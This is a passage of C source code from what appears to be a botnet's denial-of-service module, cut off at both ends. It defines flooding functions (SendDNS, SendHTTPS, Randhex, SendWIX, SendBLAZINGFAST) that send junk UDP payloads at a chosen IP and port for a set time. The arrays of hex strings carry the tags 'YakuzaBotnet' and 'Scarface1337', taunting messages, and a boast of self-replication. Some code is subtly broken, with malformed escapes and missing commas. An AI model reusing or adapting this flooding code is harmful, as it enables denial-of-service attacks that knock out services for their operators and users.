        "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A",
        "\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA",
        "\x0D\x1E\x1F\x12\x06\x62\x26\x12\x62\x0D\x12\x01\x06\x0D\x1C\x01\x32\x12\x6C\x63\x1B\x32\x6C\x63\x3C\x32\x62\x63\x6C\x26\x12\x1C\x12\x6C\x63\x62\x06\x12\x21\x2D\x32\x62\x11\x2D\x21\x32\x62\x10\x12\x01\x0D\x12\x30\x21\x2D\x30\x13\x1C\x1E\x10\x01\x10\x3E\x3C\x32\x37\x01\x0D\x10\x12\x12\x30\x2D\x62\x10\x12\x1E\x10\x0D\x12\x1E\x1C\x10\x12\x0D\x01\x10\x12\x1E\x1C\x30\x21\x2D\x32\x30\x2D\x30\x2D\x21\x30\x21\x2D\x3E\x13\x0D\x32\x20\x33\x62\x63\x12\x21\x2D\x3D\x36\x12\x62\x30\x61\x11\x10\x06\x00\x17\x22\x63\x2D\x02\x01\x6C\x6D\x36\x6C\x0D\x02\x16\x6D\x63\x12\x02\x61\x17\x63\x20\x22\x6C\x2D\x02\x63\x6D\x37\x22\x63\x6D\x00\x02\x2D\x22\x63\x6D\x17\x22\x2D\x21\x22\x63\x00\x30\x32\x60\x30\x00\x17\x22\x36\x36\x6D\x01\x6C\x0D\x12\x02\x61\x20\x62\x63\x17\x10\x62\x6C\x61\x2C\x37\x22\x63\x17\x0D\x01\x3D\x22\x63\x6C\x17\x01\x2D\x37\x63\x62\x00\x37\x17\x6D\x63\x62\x37\x3C\x54",
        "\x26\x3C\x35\x35\x36\x3D\x20\x77\x75\x31\x76\x35\x30\x77\x28\x7D\x27\x29\x7D\x7D\x34\x36\x3C\x21\x73\x30\x2D\x2D\x29\x77\x77\x2A\x2B\x32\x37\x2F\x2B\x72\x73\x22\x36\x7C\x31\x24\x21\x73\x7C\x28\x36\x77\x72\x34\x72\x24\x70\x2E\x2B\x3F\x28\x26\x23\x24\x2F\x71\x7D\x7C\x72\x7C\x74\x26\x28\x21\x32\x2F\x23\x33\x20\x20\x2C\x2F\x7C\x20\x23\x28\x2A\x2C\x20\x2E\x36\x73\x2A\x27\x74\x31\x7D\x20\x33\x2C\x30\x29\x72\x3F\x73\x23\x30\x2D\x34\x74\x2B\x2E\x37\x73\x2F\x2B\x71\x35\x2C\x34\x2C\x36\x34\x3D\x28\x24\x27\x29\x71\x2A\x26\x30\x77\x35\x2F\x35\x35\x37\x2E\x2F\x28\x72\x27\x23\x2F\x2D\x76\x31\x36\x74\x30\x29\x45",
        "y8rtyutvybt978b5tybvmx0e8ytnv58ytr57yrn56745t4twev4vt4te45yn57ne46e456be467mt6ur567d5r6e5n65nyur567nn55sner6rnut7nnt7yrt7r6nftynr567tfynxyummimiugdrnyb"
        "\x64\x61\x79\x7a\x64\x64\x6f\x73\x2e\x63\x6f\x20\x72\x75\x6e\x73\x20\x79\x6f\x75\x20\x69\x66\x20\x79\x6f\x75\x20\x72\x65\x61\x64\x20\x74\x68\x69\x73\x20\x6c\x6f\x6c\x20\x74\x68\x65\x6e\x20\x79\x6f\x75\x20\x74\x63\x70\x20\x64\x75\x6d\x70\x65\x64\x20\x69\x74\x20\x62\x65\x63\x61\x75\x73\x65\x20\x69\x74\x20\x68\x69\x74\x20\x79\x6f\x75\x20\x61\x6e\x64\x20\x79\x6f\x75\x20\x6e\x65\x65\x64\x20\x74\x6f\x20\x70\x61\x74\x63\x68\x20\x69\x74\x20\x6c\x6f\x6c\x6f\x6c\x6f\x6c\x6f\x6c\x6f\x6c",
        "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A",
        "\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA",
        "\x0D\x1E\x1F\x12\x06\x62\x26\x12\x62\x0D\x12\x01\x06\x0D\x1C\x01\x32\x12\x6C\x63\x1B\x32\x6C\x63\x3C\x32\x62\x63\x6C\x26\x12\x1C\x12\x6C\x63\x62\x06\x12\x21\x2D\x32\x62\x11\x2D\x21\x32\x62\x10\x12\x01\x0D\x12\x30\x21\x2D\x30\x13\x1C\x1E\x10\x01\x10\x3E\x3C\x32\x37\x01\x0D\x10\x12\x12\x30\x2D\x62\x10\x12\x1E\x10\x0D\x12\x1E\x1C\x10\x12\x0D\x01\x10\x12\x1E\x1C\x30\x21\x2D\x32\x30\x2D\x30\x2D\x21\x30\x21\x2D\x3E\x13\x0D\x32\x20\x33\x62\x63\x12\x21\x2D\x3D\x36\x12\x62\x30\x61\x11\x10\x06\x00\x17\x22\x63\x2D\x02\x01\x6C\x6D\x36\x6C\x0D\x02\x16\x6D\x63\x12\x02\x61\x17\x63\x20\x22\x6C\x2D\x02\x63\x6D\x37\x22\x63\x6D\x00\x02\x2D\x22\x63\x6D\x17\x22\x2D\x21\x22\x63\x00\x30\x32\x60\x30\x00\x17\x22\x36\x36\x6D\x01\x6C\x0D\x12\x02\x61\x20\x62\x63\x17\x10\x62\x6C\x61\x2C\x37\x22\x63\x17\x0D\x01\x3D\x22\x63\x6C\x17\x01\x2D\x37\x63\x62\x00\x37\x17\x6D\x63\x62\x37\x3C\x54",
        "\x26\x3C\x35\x35\x36\x3D\x20\x77\x75\x31\x76\x35\x30\x77\x28\x7D\x27\x29\x7D\x7D\x34\x36\x3C\x21\x73\x30\x2D\x2D\x29\x77\x77\x2A\x2B\x32\x37\x2F\x2B\x72\x73\x22\x36\x7C\x31\x24\x21\x73\x7C\x28\x36\x77\x72\x34\x72\x24\x70\x2E\x2B\x3F\x28\x26\x23\x24\x2F\x71\x7D\x7C\x72\x7C\x74\x26\x28\x21\x32\x2F\x23\x33\x20\x20\x2C\x2F\x7C\x20\x23\x28\x2A\x2C\x20\x2E\x36\x73\x2A\x27\x74\x31\x7D\x20\x33\x2C\x30\x29\x72\x3F\x73\x23\x30\x2D\x34\x74\x2B\x2E\x37\x73\x2F\x2B\x71\x35\x2C\x34\x2C\x36\x34\x3D\x28\x24\x27\x29\x71\x2A\x26\x30\x77\x35\x2F\x35\x35\x37\x2E\x2F\x28\x72\x27\x23\x2F\x2D\x76\x31\x36\x74\x30\x29\x45",
        "y8rtyutvybt978b5tybvmx0e8ytnv58ytr57yrn56745t4twev4vt4te45yn57ne46e456be467mt6ur567d5r6e5n65nyur567nn55sner6rnut7nnt7yrt7r6nftynr567tfynxyummimiugdrnyb"
        };
        if (a >= 50)
        {
            send(std_hex, rhexstring, std_packet, 0);
            connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(std_hex);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}
    void SendDNS(unsigned char *ip, int port, int secs)
    {
    int std_hex;
    std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1)
    {
        char *rhexstring[] = {
        "\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58",
        "/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58",
        };
        if (a >= 50)
        {
            send(std_hex, rhexstring, std_packet, 0);
            connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(std_hex);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}
    void SendHTTPS(unsigned char *ip, int port, int secs)
    {
    int std_hex;
    std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1)
    {
        char *rhexstring[] = {
        "\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58",
        "/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58",
        };
        if (a >= 50)
        {
            send(std_hex, rhexstring, std_packet, 0);
            connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(std_hex);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}

void Randhex(unsigned char * ip, int port, int secs) {
          int iSTD_Sock;
          iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);
          time_t start = time(NULL);
          struct sockaddr_in sin;
          struct hostent * hp;
          hp = gethostbyname(ip);
          bzero((char * ) & sin, sizeof(sin));
          bcopy(hp -> h_addr, (char * ) & sin.sin_addr, hp -> h_length);
          sin.sin_family = hp -> h_addrtype;
          sin.sin_port = port;
          unsigned int a = 0;
          while (1) { // random std string
            char * randstrings[] = {
              "\x03",
              "\x04",
              "\x05",
              "\x06",
              "\x07",
              "\x08",
              "\x09",
              "\x0a",
              "\x0b",
              "\x0c",
              "\x0d",
              "\x0e",
              "\x0f",
              "\x10",
              "\x11",
              "\x12",
              "\x13",
              "\x14",
              "\x15",
              "\x16",
              "\x17",
              "\x18",
              "\x19",
              "\x1a",
              "\x1b",
              "\x1c",
              "\x1d",
              "\x1e",
              "\x1f",
              "\x20",
              "\x21",
              "\x22",
              "\x23",
              "\x24",
              "\x25",
              "\x26",
              "\x27",
              "\x28",
              "\x29",
              "\x2a",
              "\x2b",
              "\x2c",
              "\x2d",
              "\x2e",
              "\x2f",
              "\x30",
              "\x31",
              "\x32",
              "\x33",
              "\x34",
              "\x35",
              "\x36",
              "\x37",
              "\x38",
              "\x39",
              "\x3a",
              "\x3b",
              "\x3c",
              "\x3d",
              "\x3e",
              "\x3f",
              "\x40",
              "\x41",
              "\x42",
              "\x43",
              "\x44",
              "\x45",
              "\x46",
              "\x47",
              "\x48",
              "\x49",
              "\x4a",
              "\x4b",
              "\x4c",
              "\x4d",
              "\x4e",
              "\x4f",
              "\x50",
              "\x51",
              "\x52",
              "\x53",
              "\x54",
              "\x55",
              "\x56",
              "\x57",
              "\x58",
              "\x59",
              "\x5a",
              "\x5b",
              "\x5c",
              "\x5d",
              "\x5e",
              "\x5f",
              "\x60",
              "\x61",
              "\x62",
              "\x63",
              "\x64",
              "\x65",
              "\x66",
              "\x67",
              "\x68",
              "\x69",
              "\x6a",
              "\x6b",
              "\x6c",
              "\x6d",
              "\x6e",
              "\x6f",
              "\x70",
              "\x71",
              "\x72",
              "\x73",
              "\x74",
              "\x75",
              "\x76",
              "\x77",
              "\x78",
              "\x79",
              "\x7a",
              "\x7b",
              "\x7c",
              "\x7d",
              "\x7e",
              "\x7f",
              "\x80",
              "\x81",
              "\x82",
              "\x83",
              "\x84",
              "\x85",
              "\x86",
              "\x87",
              "\x88",
              "\x89",
              "\x8a",
              "\x8b",
              "\x8c",
              "\x8d",
              "\x8e",
              "\x8f",
              "\x90",
              "\x91",
              "\x92",
              "\x93",
              "\x94",
              "\x95",
              "\x96",
              "\x97",
              "\x98",
              "\x99",
              "\x9a",
              "\x9b",
              "\x9c",
              "\x9d",
              "\x9e",
              "\x9f",
              "\xa0",
              "\xa1",
              "\xa2",
              "\xa3",
              "\xa4",
              "\xa5",
              "\xa6",
              "\xa7",
              "\xa8",
              "\xa9",
              "\xaa",
              "\xab",
              "\xac",
              "\xad",
              "\xae",
              "\xaf",
              "\xb0",
              "\xb1",
              "\xb2",
              "\xb3",
              "\xb4",
              "\xb5",
              "\xb6",
              "\xb7",
              "\xb8",
              "\xb9",
              "\xba",
              "\xbb",
              "\xbc",
              "\xbd",
              "\xbe",
              "\xbf",
              "\xc0",
              "\xc1",
              "\xc2",
              "\xc3",
              "\xc4",
              "\xc5",
              "\xc6",
              "\xc7",
              "\xc8",
              "\xc9",
              "\xca",
              "\xcb",
              "\xcc",
              "\xcd",
              "\xce",
              "\xcf",
              "\xd0",
              "\xd1",
              "\xd2",
              "\xd3",
              "\xd4",
              "\xd5",
              "\xd6",
              "\xd7",
              "\xd8",
              "\xd9",
              "\xda",
              "\xdb",
              "\xdc",
              "\xdd",
              "\xde",
              "\xdf",
              "\xe0",
              "\xe1",
              "\xe2",
              "\xe3",
              "\xe4",
              "\xe5",
              "\xe6",
              "\xe7",
              "\xe8",
              "\xe9",
              "\xea",
              "\xeb",
              "\xec",
              "\xed",
              "\xee",
              "\xef",
              "\xf0",
              "\xf1",
              "\xf2",
              "\xf3",
              "\xf4",
              "\xf5",
              "\xf6",
              "\xf7",
              "\xf8",
              "\xf9",
              "\xfa",
              "\xfb",
              "\xfc",
              "\xfd",
              "\xfe",
              "\xff"
              "PozHlpiND4xPDPuGE6tq",
              "tg57YSAcuvy2hdBlEWMv",
              "VaDp3Vu5m5bKcfCU96RX",
              "UBWcPjIZOdZ9IAOSZAy6",
              "JezacHw4VfzRWzsglZlF",
              "3zOWSvAY2dn9rKZZOfkJ",
              "oqogARpMjAvdjr9Qsrqj",
              "yQAkUvZFjxExI3WbDp2g",
              "35arWHE38SmV9qbaEDzZ",
              "kKbPlhAwlxxnyfM3LaL0",
              "a7pInUoLgx1CPFlGB5JF",
              "yFnlmG7bqbW682p7Bzey",
              "S1mQMZYF6uLzzkiULnGF",
              "jKdmCH3hamvbN7ZvzkNA",
              "bOAFqQfhvMFEf9jEZ89M",
              "VckeqgSPaAA5jHdoFpCC",
              "CwT01MAGqrgYRStHcV0X",
              "72qeggInemBIQ5uJc1jQ",
              "zwcfbtGDTDBWImROXhdn",
              "w70uUC1UJYZoPENznHXB",
              "EoXLAf1xXR7j4XSs0JTm",
              "lgKjMnqBZFEvPJKpRmMj",
              "lSvZgNzxkUyChyxw1nSr",
              "VQz4cDTxV8RRrgn00toF",
              "YakuzaBotnet",
              "Scarface1337"
              "\x53\x65\x6c\x66\x20\x52\x65\x70\x20\x46\x75\x63\x6b\x69\x6e\x67\x20\x4e\x65\x54\x69\x53\x20\x61\x6e\x64\x20\x54\x68\x69\x73\x69\x74\x79\x20\x30\x6e\x20\x55\x72\x20\x46\x75\x43\x6b\x49\x6e\x47\x20\x46\x6f\x52\x65\x48\x65\x41\x64\x20\x57\x65\x20\x42\x69\x47\x20\x4c\x33\x33\x54\x20\x48\x61\x78\x45\x72\x53\x0a",
              "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A",
              "\x77\x47\x5E\x27\x7A\x4E\x09\xF7\xC7\xC0\xE6\xF5\x9B\xDC\x23\x6E\x12\x29\x25\x1D\x0A\xEF\xFB\xDE\xB6\xB1\x94\xD6\x7A\x6B\x01\x34\x26\x1D\x56\xA5\xD5\x8C\x91\xBC\x8B\x96\x29\x6D\x4E\x59\x38\x4F\x5C\xF0\xE2\xD1\x9A\xEA\xF8\xD0\x61\x7C\x4B\x57\x2E\x7C\x59\xB7\xA5\x84\x99\xA4\xB3\x8E\xD1\x65\x46\x51\x30\x77\x44\x08\xFA\xD9\x92\xE2\xF0\xC8\xD5\x60\x77\x52\x6D\x21\x02\x1D\xFC\xB3\x80\xB4\xA6\x9D\xD4\x28\x24\x03\x5A\x35\x14\x5B\xA8\xE0\x8A\x9A\xE8\xC0\x91\x6C\x7B\x47\x5E\x6C\x69\x47\xB5\xB4\x89\xDC\xAF\xAA\xC1\x2E\x6A\x04\x10\x6E\x7A\x1C\x0C\xF9\xCC\xC0\xA0\xF8\xC8\xD6\x2E\x0A\x12\x6E\x76\x42\x5A\xA6\xBE\x9F\xA6\xB1\x90\xD7\x24\x64\x15\x1C\x20\x0A\x19\xA8\xF9\xDE\xD1\xBE\x96\x95\x64\x38\x4C\x53\x3C\x40\x56\xD1\xC5\xED\xE8\x90\xB0\xD2\x22\x68\x06\x5B\x38\x33\x00\xF4\xF3\xC6\x96\xE5\xFA\xCA\xD8\x30\x0D\x50\x23\x2E\x45\x52\xF6\x80\x94",
              "8d\xc1x\x01\xb8\x9b\xcb\x8f\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
              "/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58",
              "\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x21\x58\x99\x21\x58\x99\x21\x58\x06"
            };
            char * STD2_STRING = randstrings[rand() % (sizeof(randstrings) / sizeof(char * ))];
            if (a >= 50) {
              send(iSTD_Sock, STD2_STRING, std_packet, 0);
              connect(iSTD_Sock, (struct sockaddr * ) & sin, sizeof(sin));
              if (time(NULL) >= start + secs) {
                close(iSTD_Sock);
                _exit(0);
              }
              a = 0;
            }
            a++;
          }
}

    void SendWIX(unsigned char *ip, int port, int secs)
    {
    int std_hex;
    std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1)
    {
        char *rhexstring[] = {
        "\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58",
        "/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58",
        };
        if (a >= 50)
        {
            send(std_hex, rhexstring, std_packet, 0);
            connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(std_hex);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}
    void SendBLAZINGFAST(unsigned char *ip, int port, int secs)
    {
    int std_hex;
    std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
